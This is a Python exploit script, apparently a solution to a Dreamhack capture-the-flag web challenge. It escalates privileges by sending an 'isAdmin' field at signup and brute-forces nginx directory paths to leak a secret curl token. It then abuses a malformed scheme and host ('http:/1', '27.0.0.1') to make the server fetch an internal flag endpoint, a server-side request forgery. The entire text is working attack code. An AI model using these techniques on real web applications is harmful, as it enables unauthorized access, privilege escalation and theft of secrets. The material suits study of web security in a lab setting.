import requests

URL = "http://host3.dreamhack.games:8510/"

res = requests.post(URL + "/app/signup", data={"username":"guest","password":"guest","isAdmin":"1"})

s = requests.Session()

s.post(URL + "/app/login", data={"username":"guest","password":"guest"})

data = ""

for h in range(0, 0xff+1):
    res = requests.get(URL + f"/etc/nginx/{hex(h)[2:].zfill(2)}/curl-token")
    print(f"/etc/nginx/{hex(h)[2:].zfill(2)}/curl-token")
    if "404 Not Found" not in res.text:
        data = res.text.strip()
        break

res = s.post(URL + "/app/admin", data={"scheme":"http:/1","host":"27.0.0.1","port":"8002","path":"/app/flag"}, cookies={"X-CURL-TOKEN":data.split("=")[1]})
print(res.text)